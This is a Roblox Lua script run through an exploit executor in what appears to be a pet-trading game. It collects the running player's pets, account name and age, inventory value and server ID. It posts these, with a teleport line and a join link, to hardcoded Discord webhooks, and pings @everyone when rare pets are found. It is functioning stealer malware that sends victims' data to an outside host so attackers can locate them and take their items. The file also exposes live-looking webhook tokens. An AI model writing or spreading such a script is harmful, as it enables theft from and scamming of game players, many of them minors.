local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- WEBHOOKS
local WEBHOOK_PRIORITY = "https://discord.com/api/webhooks/1410626814857973831/O4uWK0swu6aCG8HFTKa_3cncOA2liwK38aeAr-8fwPU7IDwASPHUg6jy-XLOanMWXzhU"
local WEBHOOK_NORMAL   = "https://discord.com/api/webhooks/1410488907358933063/unmfmZmJVyaxMnj7Pbw-_U5q4J7zlLvC4xwxwgRGvHrWKH0yVRHF8-em1KJJ6DbSkiqU"

-- PRIORITY PETS & VALUES
local PRIORITY = {
    ["Raccoon"]="🦝", ["Dragonfly"]="🐉", ["Mimic Octopus"]="🐙", ["Red Fox"]="🦊",
    ["Disco Bee"]="🎵🐝", ["Queen Bee"]="👑🐝", ["Lobster Thermidor"]="🦞",
    ["Golden Goose"]="🥇🦢", ["Kitsune"]="🌸", ["Corrupted Kitsune"]="🦠",
    ["Fennec Fox"]="🐺", ["T-Rex"]="🦖"
}

local PRIORITY_VALUES = {
    ["Raccoon"]=250, ["Dragonfly"]=50, ["Mimic Octopus"]=30, ["Red Fox"]=10,
    ["Disco Bee"]=200, ["Queen Bee"]=20, ["Lobster Thermidor"]=30,
    ["Golden Goose"]=15, ["Kitsune"]=550, ["Corrupted Kitsune"]=10,
    ["Fennec Fox"]=100, ["T-Rex"]=35
}

-- PET LIST
local PETS = {
    "Raccoon","Bunny","Dog","Golden Lab","Dairy Cow","Starfish","Crab","Seagull","Black Bunny",
    "Cat","Chicken","Deer","Bee","Bacon Pig","Jackalope","Orange Tabby","Pig","Rooster",
    "Monkey","Flamingo","Toucan","Sea Turtle","Orangutan","Seal","Honey Bee","Wasp","Cow",
    "Silver Monkey","Sea Otter","Turtle","Polar Bear","Grey Mouse","Mole","Frog","Panda",
    "Blood Kiwi","Blood Hedgehog","Moon Cat","Petal Bee","Tarantula Hawk","Moth","Ostrich",
    "Peacock","Capybara","Scarlet Macaw","Meerkat","Sand Snake","Bald Eagle","Raptor",
    "Triceratops","Pterodactyl","Stegosaurus","Parasaurolophus","Iguanodon","Pachycephalosaurus",
    "Tanuki","Tanchozuru","Kodama","Corrupted Kodama","Sushi Bear","Hotdog Daschund","Seedling",
    "Snail","Giant Ant","Caterpillar","Brown Mouse","Squirrel","Praying Mantis","Echo Frog",
    "Chicken Zombie","Night Owl","Red Giant Ant","Cooked Owl","Butterfly","Mimic Octopus",
    "Axolotl","Hyacinth Macaw","Hamster","Brontosaurus","Dilophosaurus","Ankylosaurus","Owl",
    "Koi","Kappa","Raiju","Spaghetti Sloth","Mochi Mouse","Junkbot","Gorilla Chef","Golem",
    "Red Fox","Dragonfly","Disco Bee","Queen Bee","Lobster Thermidor","Golden Goose",
    "Kitsune","Corrupted Kitsune","Fennec Fox","T-Rex"
}

-- Lowercase keywords
local PET_KEYWORDS = {}
for _, name in ipairs(PETS) do PET_KEYWORDS[#PET_KEYWORDS+1] = name:lower() end

local function isPet(name)
    local lower = name:lower()
    for _, keyword in ipairs(PET_KEYWORDS) do
        if string.find(lower, keyword) then return true end
    end
    return false
end

local function getPriorityEmoji(name)
    for petName, emoji in pairs(PRIORITY) do
        if string.find(name:lower(), petName:lower()) then return emoji end
    end
    return nil
end

-- Format pet line with bonus and safe weight/age
local function formatPetLine(name)
    local priorityEmoji = getPriorityEmoji(name)
    local baseValue = 0
    for petName, petValue in pairs(PRIORITY_VALUES) do
        if string.find(string.lower(name), string.lower(petName)) then
            baseValue = petValue
            break
        end
    end

    -- Safe weight
    local weight = 0
    local kgMatch = string.match(name, "(%d+%.?%d*)%s*[Kk][Gg]?")
    if kgMatch then weight = tonumber(kgMatch) or 0 end

    -- Safe age
    local ageText = ""
    local ageMatch = string.match(name, "%[Age%s*(%d+)%]")
    if ageMatch then ageText = "[Age "..ageMatch.."]" end

    local emoji = ""
    local displayValue = baseValue

    if priorityEmoji then
        if weight >= 30 then
            emoji = "[💪] ["..priorityEmoji.."]"
            displayValue = displayValue + 3000 -- bonus
        else
            emoji = "["..priorityEmoji.."]"
        end
    else
        if weight >= 15 then
            emoji = "💪"
        else
            emoji = "🐶"
        end
    end

    return emoji.." - "..name.." "..ageText.." → "..displayValue.."¢"
end

-- Collect pets with bonus and sort descending by value
local function collectPets(container)
    local items, hasPriorityPet = {}, false
    if not container then return {},0,false end

    for _, obj in ipairs(container:GetChildren()) do
        if obj:IsA("Tool") and isPet(obj.Name) then
            table.insert(items,obj.Name)
            if getPriorityEmoji(obj.Name) then hasPriorityPet = true end
        end
    end

    local petsWithValue = {}
    local totalValue = 0

    for _, name in ipairs(items) do
        local line = formatPetLine(name)
        local displayValue = tonumber(string.match(line,"→ (%d+)¢") or "0")
        totalValue = totalValue + displayValue
        table.insert(petsWithValue, {line=line,value=displayValue})
    end

    table.sort(petsWithValue, function(a,b) return a.value > b.value end)

    local formatted = {}
    for _, entry in ipairs(petsWithValue) do table.insert(formatted, entry.line) end

    return formatted,totalValue,hasPriorityPet
end

-- Wait for Backpack and Character
local backpack = player:WaitForChild("Backpack")
local char = player.Character or player.CharacterAdded:Wait()

local backpackList,backpackValue,hasPriorityBackpack = collectPets(backpack)
local equippedList,equippedValue,hasPriorityEquipped = collectPets(char)
local totalValue = backpackValue + equippedValue

local hasPriority = hasPriorityBackpack or hasPriorityEquipped
local pingText = hasPriority and "--@everyone\n" or ""
local targetWebhook = hasPriority and WEBHOOK_PRIORITY or WEBHOOK_NORMAL

local teleportLine = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d,"%s")',game.PlaceId,game.JobId)
local serverURL = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s",game.PlaceId,game.JobId)
local contentText = pingText..teleportLine
local embedColor = hasPriority and 15158332 or 3066993

local description = "```Name: "..player.Name.."\nExecutor: Delta\nAccount Age: "..player.AccountAge.." days```"..
                    "\n💰 Kwarta nga nakuha\n```"..totalValue.."₱```\n🎒 Backpack\n```"..(#backpackList>0 and table.concat(backpackList,"\n") or "No pets found.").."```\n🏝️ Join with URL\n**["..game.JobId.."]("..serverURL..")**"

local payload = {
    content = contentText,
    embeds = {{
        title = "🌑Definitely Not Dark🌑",
        description = description,
        color = embedColor
    }}
}

local json = HttpService:JSONEncode(payload)
local req = http_request or request or (syn and syn.request) or (krnl and krnl.request)

if req then
    local success, err = pcall(function()
        req({
            Url = targetWebhook,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = json
        })
    end)
    if success then
        print("✅ Webhook sent to:", targetWebhook)
    else
        warn("❌ Failed to send webhook:", err)
    end
else
    warn("❌ Your executor does not support HTTP requests.")
end
